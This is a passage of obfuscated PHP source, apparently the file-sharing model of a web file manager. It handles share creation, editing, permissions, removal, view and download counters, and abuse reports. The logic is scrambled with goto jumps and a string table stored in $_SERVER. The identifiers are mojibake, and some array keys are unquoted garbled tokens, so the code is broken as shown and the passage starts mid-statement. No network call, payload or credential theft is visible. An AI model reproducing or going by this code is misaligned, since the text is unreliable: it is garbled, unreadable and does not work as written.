array($cñú‚Ì¢Îã[450] => 1); } else { if ($A®ùŒÉùüÖ == $cñú‚Ì¢Îã[993]) { $AÓ∏ó⁄¡˜Ê = array($cñú‚Ì¢Îã[452] => 1); } } $AÓ∏ó⁄¡˜Ê[$cñú‚Ì¢Îã[1397]] = USER_ID; $b‘ú¨â…ìÌ = $this->where($AÓ∏ó⁄¡˜Ê)->selectPage($C©∑≈®çÕ‘); return $b‘ú¨â…ìÌ; } protected function listToMe($eíçûƒ©î¯ = 300) { goto cÓ÷êã¥êÇ; F⁄ˆ”ﬂÂ–€: $BËä’îò£– = array_to_keyvalue_group($EÆÉñ»¬∏ë[$D™Øì Èëé[360]], $D™Øì Èëé[445]); if (!$BËä’îò£–) { return $EÆÉñ»¬∏ë; } $F¢†£ûÑçê = $D™Øì Èëé[2174]; goto fÂ¯ŸıµÖÁ; fÂ¯ŸıµÖÁ: $BéÒ≈ä‚íﬂ = array($D™Øì Èëé[445] => array($D™Øì Èëé[389], array_keys($BËä’îò£–))); $Bﬂáä”‹Ëò = $this->field($F¢†£ûÑçê)->where($BéÒ≈ä‚íﬂ)->select(); foreach ($Bﬂáä”‹Ëò as $a‡ìäç€∑ü => &$c¯Ü¯¶€ñâ) { $c¯Ü¯¶€ñâ[$D™Øì Èëé[2171]] = $BËä’îò£–[$c¯Ü¯¶€ñâ[$D™Øì Èëé[445]]]; } goto f„Ωá¥Æëà; f„Ωá¥Æëà: $CÙò‚’ÿ’¥ = array($D™Øì Èëé[2175] => $Bﬂáä”‹Ëò, $D™Øì Èëé[2176] => $EÆÉñ»¬∏ë[$D™Øì Èëé[357]]); return $CÙò‚’ÿ’¥; goto Cê‘á±⁄§ƒ; cÓ÷êã¥êÇ: $D™Øì Èëé =& $_SERVER[Æ¡î¢≠¯™]; $Cõ—°•Ÿ≥‡ = Session::get($D™Øì Èëé[2173]); $EÑËÉÕ ¯Ì = array_to_keyvalue($Cõ—°•Ÿ≥‡, $D™Øì Èëé[33], $D™Øì Èëé[2061]); goto E¥«ßƒœèø; E¥«ßƒœèø: $BéÒ≈ä‚íﬂ = array($D™Øì Èëé[525] => SourceModel::TYPE_USER, $D™Øì Èëé[460] => USER_ID); if ($EÑËÉÕ ¯Ì) { $BéÒ≈ä‚íﬂ = array(array($D™Øì Èëé[525] => SourceModel::TYPE_USER, $D™Øì Èëé[460] => USER_ID), array($D™Øì Èëé[525] => SourceModel::TYPE_GROUP, $D™Øì Èëé[460] => array($D™Øì Èëé[7], $EÑËÉÕ ¯Ì)), $D™Øì Èëé[2172] => $D™Øì Èëé[2141]); } $EÆÉñ»¬∏ë = Model($D™Øì Èëé[541])->where($BéÒ≈ä‚íﬂ)->selectPage($eíçûƒ©î¯); goto F⁄ˆ”ﬂÂ–€; Cê‘á±⁄§ƒ: } protected function shareAdd($eí‚ÖÃ€ƒã, $bÕŸØÉÉÜ≤) { $aèà∑ÛößÈ =& $_SERVER[Æ¡î¢≠¯™]; $a¡Ø¡“í…§ = $this->_addShareData($eí‚ÖÃ€ƒã, $bÕŸØÉÉÜ≤); if (!empty($bÕŸØÉÉÜ≤[$aèà∑ÛößÈ[2177]])) { $this->_shareAuthSet($a¡Ø¡“í…§, $bÕŸØÉÉÜ≤[$aèà∑ÛößÈ[2177]]); } $this->shareEventAdd($eí‚ÖÃ€ƒã, $bÕŸØÉÉÜ≤, $aèà∑ÛößÈ[996]); return $a¡Ø¡“í…§; } private function shareEventAdd($AŒ‰ÿˆú°ú, $Cﬁ⁄¥çâ∂±, $E™ﬂÃÁëÔö = "\x61\144\144") { goto D”É±ò°ã; A∫º©Ø„ç‡: $FÆÍî©çáª = $fı©Ωëıóﬂ[2180]; if ($B⁄åπƒ°ø†[$fı©Ωëıóﬂ[450]] == $fı©Ωëıóﬂ[472] && $Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[450]] == $fı©Ωëıóﬂ[93]) { $FÆÍî©çáª = $fı©Ωëıóﬂ[2178]; } if ($B⁄åπƒ°ø†[$fı©Ωëıóﬂ[450]] == $fı©Ωëıóﬂ[93] && $Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[450]] == $fı©Ωëıóﬂ[472]) { $FÆÍî©çáª = $fı©Ωëıóﬂ[2181]; } goto còøÉ”«ßó; D”É±ò°ã: $fı©Ωëıóﬂ =& $_SERVER[Æ¡î¢≠¯™]; if ($E™ﬂÃÁëÔö == $fı©Ωëıóﬂ[996]) { if ($Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[450]] == $fı©Ωëıóﬂ[93]) { Model($fı©Ωëıóﬂ[509])->eventShare($AŒ‰ÿˆú°ú, $fı©Ωëıóﬂ[2178]); } if ($Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[452]] == $fı©Ωëıóﬂ[93]) { Model($fı©Ωëıóﬂ[509])->eventShare($AŒ‰ÿˆú°ú, $fı©Ωëıóﬂ[2179]); } return; } $B⁄åπƒ°ø† = $this->getInfoByPath($AŒ‰ÿˆú°ú); goto A∫º©Ø„ç‡; A¨ﬁéíÉ”‡: return; goto CÏÇÉÑîóÉ; còøÉ”«ßó: if ($B⁄åπƒ°ø†[$fı©Ωëıóﬂ[452]] == $fı©Ωëıóﬂ[472] && $Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[452]] == $fı©Ωëıóﬂ[93]) { $FÆÍî©çáª = $fı©Ωëıóﬂ[2179]; } if ($B⁄åπƒ°ø†[$fı©Ωëıóﬂ[452]] == $fı©Ωëıóﬂ[93] && $Cﬁ⁄¥çâ∂±[$fı©Ωëıóﬂ[452]] == $fı©Ωëıóﬂ[472]) { $FÆÍî©çáª = $fı©Ωëıóﬂ[2182]; } Model($fı©Ωëıóﬂ[509])->eventShare($AŒ‰ÿˆú°ú, $FÆÍî©çáª); goto A¨ﬁéíÉ”‡; CÏÇÉÑîóÉ: } private function _addShareData($cıó·Òµ”∏, $C≤ÜªÙôπº = array()) { goto Bê‰∆≈õ÷´; fñ≠ÛÆùïˆ: return $DÇà∫û´ÛÚ; goto då¨¡Éõà±; Bê‰∆≈õ÷´: $F≥ÛÂë⁄Èç =& $_SERVER[Æ¡î¢≠¯™]; $D‘Ïôãë‡ê = array($F≥ÛÂë⁄Èç[388] => $cıó·Òµ”∏, $F≥ÛÂë⁄Èç[1388] => USER_ID); if ($cıó·Òµ”∏ == 0) { $D‘Ïôãë‡ê = array($F≥ÛÂë⁄Èç[2183] => $C≤ÜªÙôπº[$F≥ÛÂë⁄Èç[1004]], $F≥ÛÂë⁄Èç[1388] => USER_ID); } goto cÈüÓ™î∑À; c ª•‚äçó: $Cƒêµµ…ÿì = array($F≥ÛÂë⁄Èç[1388] => USER_ID, $F≥ÛÂë⁄Èç[388] => $cıó·Òµ”∏, $F≥ÛÂë⁄Èç[1305] => $F≥ÛÂë⁄Èç[33], $F≥ÛÂë⁄Èç[450] => 0, $F≥ÛÂë⁄Èç[452] => 0, $F≥ÛÂë⁄Èç[1004] => $F≥ÛÂë⁄Èç[33], $F≥ÛÂë⁄Èç[301] => $F≥ÛÂë⁄Èç[33], $F≥ÛÂë⁄Èç[789] => $F≥ÛÂë⁄Èç[33], $F≥ÛÂë⁄Èç[2184] => 0, $F≥ÛÂë⁄Èç[2185] => 0, $F≥ÛÂë⁄Èç[695] => 0, $F≥ÛÂë⁄Èç[2186] => $F≥ÛÂë⁄Èç[33], $F≥ÛÂë⁄Èç[447] => $F≥ÛÂë⁄Èç[33]); $CÍÙ È·◊Ç = explode($F≥ÛÂë⁄Èç[47], $F≥ÛÂë⁄Èç[2187]); foreach ($CÍÙ È·◊Ç as $dÿ√È‹æØé) { if (!isset($C≤ÜªÙôπº[$dÿ√È‹æØé])) { continue; } $Cƒêµµ…ÿì[$dÿ√È‹æØé] = $C≤ÜªÙôπº[$dÿ√È‹æØé]; } goto c¡π›°ç°¿; cÈüÓ™î∑À: if ($D¨é«´¶ﬁ¿ = $this->where($D‘Ïôãë‡ê)->find()) { return $D¨é«´¶ﬁ¿[$F≥ÛÂë⁄Èç[445]]; } if ($cıó·Òµ”∏ == 0) { $DüœΩÏÒ¿É = array($F≥ÛÂë⁄Èç[28] => get_path_this($C≤ÜªÙôπº[$F≥ÛÂë⁄Èç[85]])); } else { $DüœΩÏÒ¿É = Model($F≥ÛÂë⁄Èç[744])->sourceInfo($cıó·Òµ”∏); if (!$DüœΩÏÒ¿É) { return !1; } } if (!$C≤ÜªÙôπº[$F≥ÛÂë⁄Èç[1305]]) { $C≤ÜªÙôπº[$F≥ÛÂë⁄Èç[1305]] = $DüœΩÏÒ¿É[$F≥ÛÂë⁄Èç[28]]; } goto c ª•‚äçó; c¡π›°ç°¿: $DÇà∫û´ÛÚ = $this->add($Cƒêµµ…ÿì); $Câ¯Ûç¥Ññ = array($F≥ÛÂë⁄Èç[447] => short_id($DÇà∫û´ÛÚ)); $this->where(array($F≥ÛÂë⁄Èç[444] => $DÇà∫û´ÛÚ))->save($Câ¯Ûç¥Ññ); goto fñ≠ÛÆùïˆ; då¨¡Éõà±: } private function _shareAuthSet($d»¨Óˆ‡à≠, $E´´€±ÎùÆ) { goto FÉÚ „øÙ´; F±£Û›…úÃ: $e–°ê∑üˆ€->where(array($aÖê—ê°°ì[445] => $d»¨Óˆ‡à≠))->delete(); $C¥æ»éÑ¬„ = array(); foreach ($E´´€±ÎùÆ as $B””≈ååÖÎ) { $E¢ê’∑ÜÁæ = SourceModel::TYPE_USER; if ($B””≈ååÖÎ[$aÖê—ê°°ì[376]] == SourceModel::TYPE_GROUP) { $E¢ê’∑ÜÁæ = SourceModel::TYPE_GROUP; } $BΩ∞óâÀ»î = array($aÖê—ê°°ì[445] => $d»¨Óˆ‡à≠, $aÖê—ê°°ì[376] => $E¢ê’∑ÜÁæ, $aÖê—ê°°ì[460] => intval($B””≈ååÖÎ[$aÖê—ê°°ì[460]]), $aÖê—ê°°ì[2189] => 0, $aÖê—ê°°ì[2190] => -1); if ($B””≈ååÖÎ[$aÖê—ê°°ì[2189]]) { $BΩ∞óâÀ»î[$aÖê—ê°°ì[2189]] = $B””≈ååÖÎ[$aÖê—ê°°ì[2189]]; } else { if ($B””≈ååÖÎ[$aÖê—ê°°ì[2190]]) { $BΩ∞óâÀ»î[$aÖê—ê°°ì[2190]] = $B””≈ååÖÎ[$aÖê—ê°°ì[2190]]; } } $C¥æ»éÑ¬„[] = $BΩ∞óâÀ»î; } goto D‘ó”•ˆº¨; FÉÚ „øÙ´: $aÖê—ê°°ì =& $_SERVER[Æ¡î¢≠¯™]; if (!is_array($E´´€±ÎùÆ)) { return !1; } $e–°ê∑üˆ€ = Model($aÖê—ê°°ì[2188]); goto F±£Û›…úÃ; D‘ó”•ˆº¨: return $e–°ê∑üˆ€->addAll($C¥æ»éÑ¬„, array(), !0); goto eÉç√‡©‹œ; eÉç√‡©‹œ: } public function numViewAdd($Dú§≠¿∫Ñ) { $eêƒø»Ò†À =& $_SERVER[Æ¡î¢≠¯™]; $B≤‚Ï√µÖ‡ = array($eêƒø»Ò†À[444] => $Dú§≠¿∫Ñ); $this->where($B≤‚Ï√µÖ‡)->setAdd($eêƒø»Ò†À[2184]); } public function numDownloadAdd($DÌÖß⁄¶È) { $FÔ’ÿƒÜå =& $_SERVER[Æ¡î¢≠¯™]; $A√ÃÆÒ£π = array($FÔ’ÿƒÜå[444] => $DÌÖß⁄¶È); $this->where($A√ÃÆÒ£π)->setAdd($FÔ’ÿƒÜå[2185]); } protected function shareEdit($Bô≈ôô©µÆ, $C‰≤ëñ§Æü) { goto F∆ÎÑåÈ±≈; FéÂ∂ÿ±ŒÎ: if (isset($C‰≤ëñ§Æü[$dîÜÏ¥Ó®Ó[2177]])) { $this->_shareAuthSet($Bô≈ôô©µÆ, $C‰≤ëñ§Æü[$dîÜÏ¥Ó®Ó[2177]]); } return !0; goto E·ˆ≈âëΩ´; cÎÇá√≤ıÚ: $this->_checkLinkShare($C‰≤ëñ§Æü, $Cù®‘®á—ò); $E°∏Üö±ÉΩ = array(); $AÑúòÇïÌå = explode($dîÜÏ¥Ó®Ó[47], $dîÜÏ¥Ó®Ó[2191]); goto eÚüÒÂ”›™; eÚüÒÂ”›™: foreach ($AÑúòÇïÌå as $fÉÂ‘ﬁ•ûë) { if (!array_key_exists($fÉÂ‘ﬁ•ûë, $C‰≤ëñ§Æü)) { continue; } $E°∏Üö±ÉΩ[$fÉÂ‘ﬁ•ûë] = $C‰≤ëñ§Æü[$fÉÂ‘ﬁ•ûë]; } $this->shareEventAdd($Cù®‘®á—ò[$dîÜÏ¥Ó®Ó[374]], $C‰≤ëñ§Æü, $dîÜÏ¥Ó®Ó[2029]); $this->where(array($dîÜÏ¥Ó®Ó[444] => $Bô≈ôô©µÆ))->save($E°∏Üö±ÉΩ); goto FéÂ∂ÿ±ŒÎ; F∆ÎÑåÈ±≈: $dîÜÏ¥Ó®Ó =& $_SERVER[Æ¡î¢≠¯™]; $Cù®‘®á—ò = $this->getInfo($Bô≈ôô©µÆ); if (!$Cù®‘®á—ò) { return !1; } goto cÎÇá√≤ıÚ; E·ˆ≈âëΩ´: } private function _checkLinkShare($Bµ ‹‡Ê˘è, $D⁄ﬂÃ’ÈÓ¿) { goto DÑ»–Õ∆∆Ñ; AπÊŸ›È∆ç: $AçõÍΩœã = $this->shareFileMeta($d∏◊¶õÜœë[$dàÙüÑ∞éÍ[423]]); if (isset($AçõÍΩœã[$dàÙüÑ∞éÍ[365]]) && $AçõÍΩœã[$dàÙüÑ∞éÍ[365]] == $dàÙüÑ∞éÍ[93]) { show_json(LNG($dàÙüÑ∞éÍ[2194]), !1); } goto cê¨ìúêúè; Fã÷∆µ–È: if ($D⁄ﬂÃ’ÈÓ¿[$dàÙüÑ∞éÍ[396]][$dàÙüÑ∞éÍ[29]] != $dàÙüÑ∞éÍ[174]) { $e≤ò†Î„ëƒ = $this->_folderReport($C¡Ïæ≠òÖ ); if (!$e≤ò†Î„ëƒ) { return; } show_json(LNG($dàÙüÑ∞éÍ[2192]) . $dàÙüÑ∞éÍ[2193] . $e≤ò†Î„ëƒ, !1); } $d∏◊¶õÜœë = Model($dàÙüÑ∞éÍ[744])->fileInfoGet($D⁄ﬂÃ’ÈÓ¿[$dàÙüÑ∞éÍ[396]][$dàÙüÑ∞éÍ[374]]); if (!$d∏◊¶õÜœë) { return; } goto AπÊŸ›È∆ç; DÑ»–Õ∆∆Ñ: $dàÙüÑ∞éÍ =& $_SERVER[Æ¡î¢≠¯™]; if ($Bµ ‹‡Ê˘è[$dàÙüÑ∞éÍ[450]] != $dàÙüÑ∞éÍ[93]) { return; } $C¡Ïæ≠òÖ  = $D⁄ﬂÃ’ÈÓ¿[$dàÙüÑ∞éÍ[396]][$dàÙüÑ∞éÍ[374]]; goto Fã÷∆µ–È; cê¨ìúêúè: } private function _folderReport($fç◊ÁÈÂß¡) { goto cÿŒ’ÿï“¿; F”Ú“ŸÈ≥®: if (!$DÂ∆‰Çåª‹) { return !1; } $DÂ∆‰Çåª‹ = array_to_keyvalue($DÂ∆‰Çåª‹, $b´˘¬ïÏÖ¯[33], $b´˘¬ïÏÖ¯[423]); $eáàïÎÚí≠ = $b´˘¬ïÏÖ¯[47] . $fç◊ÁÈÂß¡ . $b´˘¬ïÏÖ¯[47]; goto cÃêˆê Âè; DÚ°˜≥ü©: $Aøá—€£öã = array_to_keyvalue($BåÛ€´Õ’ , $b´˘¬ïÏÖ¯[33], $b´˘¬ïÏÖ¯[28]); $Aøá—€£öã[] = $DŒ≤˘î—ÙØ[$b´˘¬ïÏÖ¯[28]]; return implode($b´˘¬ïÏÖ¯[8], $Aøá—€£öã); goto Cï€≈€íá÷; Aˆá˘ﬁ‡Ú†: $eÛÏç⁄õÎÉ = substr($DŒ≤˘î—ÙØ[$b´˘¬ïÏÖ¯[463]], strpos($DŒ≤˘î—ÙØ[$b´˘¬ïÏÖ¯[463]], $eáàïÎÚí≠)); $d˘çå“ò¬ = array($b´˘¬ïÏÖ¯[374] => array($b´˘¬ïÏÖ¯[7], trim($eÛÏç⁄õÎÉ, $b´˘¬ïÏÖ¯[47]))); $BåÛ€´Õ’  = Model($b´˘¬ïÏÖ¯[744])->where($d˘çå“ò¬)->field($b´˘¬ïÏÖ¯[28])->select(); goto DÚ°˜≥ü©; cÃêˆê Âè: $d˘çå“ò¬ = array($b´˘¬ïÏÖ¯[423] => array($b´˘¬ïÏÖ¯[7], $DÂ∆‰Çåª‹), $b´˘¬ïÏÖ¯[463] => array($b´˘¬ïÏÖ¯[743], "\45{$eáàïÎÚí≠}\x25"), $b´˘¬ïÏÖ¯[401] => 0); $DŒ≤˘î—ÙØ = Model($b´˘¬ïÏÖ¯[744])->where($d˘çå“ò¬)->field($b´˘¬ïÏÖ¯[2196])->find(); if (!$DŒ≤˘î—ÙØ) { return !1; } goto Aˆá˘ﬁ‡Ú†; cÿŒ’ÿï“¿: $b´˘¬ïÏÖ¯ =& $_SERVER[Æ¡î¢≠¯™]; $d˘çå“ò¬ = array($b´˘¬ïÏÖ¯[423] => array($b´˘¬ïÏÖ¯[914], 0), $b´˘¬ïÏÖ¯[681] => 3); $DÂ∆‰Çåª‹ = Model($b´˘¬ïÏÖ¯[2195])->where($d˘çå“ò¬)->field($b´˘¬ïÏÖ¯[423])->select(); goto F”Ú“ŸÈ≥®; Cï€≈€íá÷: } protected function remove($FÁÜÜéòï∑) { goto B¥ïÜ√Ê∏€; B¥ïÜ√Ê∏€: $aíÆ”’Ùè⁄ =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($FÁÜÜéòï∑)) { $FÁÜÜéòï∑ = array($aíÆ”’Ùè⁄[7], $FÁÜÜéòï∑); } $CÍ⁄ß˜‰§Õ = array($aíÆ”’Ùè⁄[445] => $FÁÜÜéòï∑); goto bÂ£∑àçºç; cÃëØÏ¶Îí: for ($A’“ã√©ıà = 0; $A’“ã√©ıà < count($BØûæÌÉŸπ); $A’“ã√©ıà++) { $D¥É¨æÀ¥Ï = $this->getInfo($BØûæÌÉŸπ[$A’“ã√©ıà]); if ($D¥É¨æÀ¥Ï[$aíÆ”’Ùè⁄[452]] == $aíÆ”’Ùè⁄[93]) { Model($aíÆ”’Ùè⁄[509])->eventShare($D¥É¨æÀ¥Ï[$aíÆ”’Ùè⁄[374]], $aíÆ”’Ùè⁄[2182]); } if ($D¥É¨æÀ¥Ï[$aíÆ”’Ùè⁄[450]] == $aíÆ”’Ùè⁄[93]) { Model($aíÆ”’Ùè⁄[509])->eventShare($D¥É¨æÀ¥Ï[$aíÆ”’Ùè⁄[374]], $aíÆ”’Ùè⁄[2181]); } } return $fâÈÃº‡é; goto eãŒºí‘¡π; bÂ£∑àçºç: $fâÈÃº‡é = $this->where($CÍ⁄ß˜‰§Õ)->delete(); if ($fâÈÃº‡é) { Model($aíÆ”’Ùè⁄[541])->where(array($aíÆ”’Ùè⁄[445] => $FÁÜÜéòï∑))->delete(); } $BØûæÌÉŸπ = is_array($FÁÜÜéòï∑) ? $FÁÜÜéòï∑[1] : array($FÁÜÜéòï∑); goto cÃëØÏ¶Îí; eãŒºí‘¡π: } protected function removeBySource($F–´õ‘»à‚) { goto eÜé∆Ëíî‡; eÜé∆Ëíî‡: $e°›Ã∏ÜÇ– =& $_SERVER[Æ¡î¢≠¯™]; $E—ù◊æâ≥ = array($e°›Ã∏ÜÇ–[388] => array($e°›Ã∏ÜÇ–[389], $F–´õ‘»à‚)); $DÌÿÛ±ÿ–Ã = $this->field($e°›Ã∏ÜÇ–[445])->where($E—ù◊æâ≥)->select(); goto c≥®·ã¯á¥; bÿÇá∫ã£·: $this->where($E—ù◊æâ≥)->delete(); Model($e°›Ã∏ÜÇ–[541])->where($E—ù◊æâ≥)->delete(); goto D†®Õ•–úá; c≥®·ã¯á¥: $DÌÿÛ±ÿ–Ã = array_to_keyvalue($DÌÿÛ±ÿ–Ã, $e°›Ã∏ÜÇ–[33], $e°›Ã∏ÜÇ–[445]); if (!$DÌÿÛ±ÿ–Ã) { return; } $E—ù◊æâ≥ = array($e°›Ã∏ÜÇ–[444] => array($e°›Ã∏ÜÇ–[389], $DÌÿÛ±ÿ–Ã)); goto bÿÇá∫ã£·; D†®Õ•–úá: } public function listAll($aåµ«ûŒÈë) { goto B∫´øÒ∞›‚; B∫´øÒ∞›‚: $F ©ÈÇê∂¨ =& $_SERVER[Æ¡î¢≠¯™]; $fäÏÊòùïî = array(); if ($aåµ«ûŒÈë[$F ©ÈÇê∂¨[1397]]) { $fäÏÊòùïî[$F ©ÈÇê∂¨[1397]] = $aåµ«ûŒÈë[$F ©ÈÇê∂¨[1397]]; } goto bÂÀ‹≥úïü; AÌ¡˘π∫”ô: return $dΩ“◊·‚ƒÚ; goto D·ê≈Òüß‹; B®ä‰¯Ç„Ø: $dΩ“◊·‚ƒÚ = $this->_makeOrder()->where($fäÏÊòùïî)->selectPage(20); if (empty($dΩ“◊·‚ƒÚ[$F ©ÈÇê∂¨[360]])) { return array(); } $this->_listDataApply($dΩ“◊·‚ƒÚ[$F ©ÈÇê∂¨[360]]); goto AÌ¡˘π∫”ô; bÂÀ‹≥úïü: if ($aåµ«ûŒÈë[$F ©ÈÇê∂¨[694]]) { $E‘ø€ﬁ–ê– = $aåµ«ûŒÈë[$F ©ÈÇê∂¨[695]] ? $aåµ«ûŒÈë[$F ©ÈÇê∂¨[695]] : strtotime(date($F ©ÈÇê∂¨[2197])); $fäÏÊòùïî[$F ©ÈÇê∂¨[194]] = array($F ©ÈÇê∂¨[327], array($aåµ«ûŒÈë[$F ©ÈÇê∂¨[694]], $E‘ø€ﬁ–ê–)); } if ($aåµ«ûŒÈë[$F ©ÈÇê∂¨[29]]) { $fäÏÊòùïî[$aåµ«ûŒÈë[$F ©ÈÇê∂¨[29]]] = 1; } else { $fäÏÊòùïî[] = array($F ©ÈÇê∂¨[450] => array($F ©ÈÇê∂¨[914], 0), $F ©ÈÇê∂¨[452] => array($F ©ÈÇê∂¨[914], 0), $F ©ÈÇê∂¨[2172] => $F ©ÈÇê∂¨[2141]); } if ($aåµ«ûŒÈë[$F ©ÈÇê∂¨[2137]]) { $fäÏÊòùïî[] = array($F ©ÈÇê∂¨[447] => $aåµ«ûŒÈë[$F ©ÈÇê∂¨[2137]], $F ©ÈÇê∂¨[1305] => array($F ©ÈÇê∂¨[743], "\45{$aåµ«ûŒÈë[$F ©ÈÇê∂¨[2137]]}\45"), $F ©ÈÇê∂¨[2172] => $F ©ÈÇê∂¨[2141]); } goto B®ä‰¯Ç„Ø; D·ê≈Òüß‹: } public function listDataApply($aë©∂˘”¶Ì) { $this->_listDataApply($aë©∂˘”¶Ì); return $aë©∂˘”¶Ì; } private function _listDataApply(&$AÑÑ¥Ñé≠) { $Aƒ‰”Òœ¨ü =& $_SERVER[Æ¡î¢≠¯™]; $bêø•Á®â˜ = array_to_keyvalue($AÑÑ¥Ñé≠, $Aƒ‰”Òœ¨ü[33], $Aƒ‰”Òœ¨ü[1397]); $bÉã∂´º·ˆ = Model($Aƒ‰”Òœ¨ü[481])->userListInfo(array_unique($bêø•Á®â˜)); $añ™£ÑÖ´Ò = array_to_keyvalue($AÑÑ¥Ñé≠, $Aƒ‰”Òœ¨ü[33], $Aƒ‰”Òœ¨ü[374]); $cà‹…ÜÙë” = Model($Aƒ‰”Òœ¨ü[744])->sourceListInfo($añ™£ÑÖ´Ò, !0); foreach ($AÑÑ¥Ñé≠ as &$fï£ÑœÜÜ¥) { $Aë’¡∏•º© = $fï£ÑœÜÜ¥[$Aƒ‰”Òœ¨ü[1397]]; $fï£ÑœÜÜ¥[$Aƒ‰”Òœ¨ü[2198]] = $bÉã∂´º·ˆ[$Aë’¡∏•º©] ? $bÉã∂´º·ˆ[$Aë’¡∏•º©] : !1; $dﬂÇïÍîÚÔ = $fï£ÑœÜÜ¥[$Aƒ‰”Òœ¨ü[374]]; $fï£ÑœÜÜ¥[$Aƒ‰”Òœ¨ü[396]] = $cà‹…ÜÙë”[$dﬂÇïÍîÚÔ] ? $cà‹…ÜÙë”[$dﬂÇïÍîÚÔ] : !1; } } private function _makeOrder($dßÂùÕÂ≠ = '') { goto eÒ¥∆±«¶‘; AâÛˆŸú∫Ó: $dÎ¡Èøˆ˘ñ = Input::get($E†πû¬«®»[411], $E†πû¬«®»[7], $E†πû¬«®»[394], $F›öìÒàêï); $EÇ¿íá´õü = Input::get($E†πû¬«®»[412], $E†πû¬«®»[7], $E†πû¬«®»[2199], array($E†πû¬«®»[2136], $E†πû¬«®»[408])); $EÇ¿íá´õü = $d“óåîâ¢û[$EÇ¿íá´õü]; goto C≈ŒŒ¨ç™Ÿ; C≈ŒŒ¨ç™Ÿ: $dßÂùÕÂ≠ = $dßÂùÕÂ≠ . "{$dÎ¡Èøˆ˘ñ}\40{$EÇ¿íá´õü}"; return $this->order($dßÂùÕÂ≠); goto DÖë≈åü∆ä; eÒ¥∆±«¶‘: $E†πû¬«®» =& $_SERVER[Æ¡î¢≠¯™]; $F›öìÒàêï = array($E†πû¬«®»[194], $E†πû¬«®»[695], $E†πû¬«®»[2184], $E†πû¬«®»[2185]); $d“óåîâ¢û = array($E†πû¬«®»[406] => $E†πû¬«®»[407], $E†πû¬«®»[408] => $E†πû¬«®»[409]); goto AâÛˆŸú∫Ó; DÖë≈åü∆ä: } public function reportAdd($a¢˜”éﬂÁÜ) { $DÛ∫¡Ø’Öˆ =& $_SERVER[Æ¡î¢≠¯™]; $aõ¬≥Ç∏éÍ = array($DÛ∫¡Ø’Öˆ[445] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[445]], $DÛ∫¡Ø’Öˆ[1397] => USER_ID); if (Model($DÛ∫¡Ø’Öˆ[2195])->where($aõ¬≥Ç∏éÍ)->find()) { return !1; } $CÉ«ŒÔà‚∑ = array($DÛ∫¡Ø’Öˆ[445] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[445]], $DÛ∫¡Ø’Öˆ[1305] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[1305]], $DÛ∫¡Ø’Öˆ[374] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[374]], $DÛ∫¡Ø’Öˆ[423] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[423]], $DÛ∫¡Ø’Öˆ[1397] => USER_ID, $DÛ∫¡Ø’Öˆ[29] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[29]], $DÛ∫¡Ø’Öˆ[409] => $a¢˜”éﬂÁÜ[$DÛ∫¡Ø’Öˆ[409]]); return Model($DÛ∫¡Ø’Öˆ[2195])->add($CÉ«ŒÔà‚∑); } public function reportList($cÙ’©ºﬁ≥ß) { goto F∆Ø˜ã›æã; F∆Ø˜ã›æã: $dû◊äÒÂÚ• =& $_SERVER[Æ¡î¢≠¯™]; $EäÛÊ†˜Üé = array(); if ($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[694]]) { $eêÂó™À¶É = $cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[695]] ? $cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[695]] : strtotime(date($dû◊äÒÂÚ•[2197])); $EäÛÊ†˜Üé[$dû◊äÒÂÚ•[194]] = array($dû◊äÒÂÚ•[327], array($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[694]], $eêÂó™À¶É)); } goto Aä‰—ë∞É©; fÖıﬂñ¶ˆé: if (empty($aô›º”Óø∏[$dû◊äÒÂÚ•[360]])) { return array(); } $this->_listDataApply($aô›º”Óø∏[$dû◊äÒÂÚ•[360]]); return $aô›º”Óø∏; goto a˘ˆ†Â€§◊; Eî©´ñ∑•ô: $DŒöêäÇêÚ = array($dû◊äÒÂÚ•[406] => $dû◊äÒÂÚ•[407], $dû◊äÒÂÚ•[408] => $dû◊äÒÂÚ•[409]); $CœúÈÿˆÜ‡ = $dû◊äÒÂÚ•[2203] . $DŒöêäÇêÚ[$AÑ®±‘ê»]; $aô›º”Óø∏ = Model($dû◊äÒÂÚ•[2195])->where($EäÛÊ†˜Üé)->order($CœúÈÿˆÜ‡)->selectPage(20); goto fÖıﬂñ¶ˆé; Aä‰—ë∞É©: if (isset($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[29]]) && in_array($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[29]], array($dû◊äÒÂÚ•[93], $dû◊äÒÂÚ•[2200], $dû◊äÒÂÚ•[2201], $dû◊äÒÂÚ•[2202], $dû◊äÒÂÚ•[1876]))) { $EäÛÊ†˜Üé[$dû◊äÒÂÚ•[29]] = $cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[29]]; } if (isset($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[681]]) && in_array($cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[681]], array($dû◊äÒÂÚ•[472], $dû◊äÒÂÚ•[93], $dû◊äÒÂÚ•[2200], $dû◊äÒÂÚ•[2201]))) { $EäÛÊ†˜Üé[$dû◊äÒÂÚ•[681]] = $cÙ’©ºﬁ≥ß[$dû◊äÒÂÚ•[681]]; } $AÑ®±‘ê» = Input::get($dû◊äÒÂÚ•[412], $dû◊äÒÂÚ•[7], $dû◊äÒÂÚ•[2199], array($dû◊äÒÂÚ•[2136], $dû◊äÒÂÚ•[408])); goto Eî©´ñ∑•ô; a˘ˆ†Â€§◊: } public function reportStatus($fü≤∫ì∂ß€) { goto E∑‘î«Ô„‹; D∂·êóã™¡: if (!$AÁ”ùÔû¨Î) { return !1; } $bÂ®Ë˘¬„“ = array($bÜ–ö Ê …[681] => $fü≤∫ì∂ß€[$bÜ–ö Ê …[681]]); if 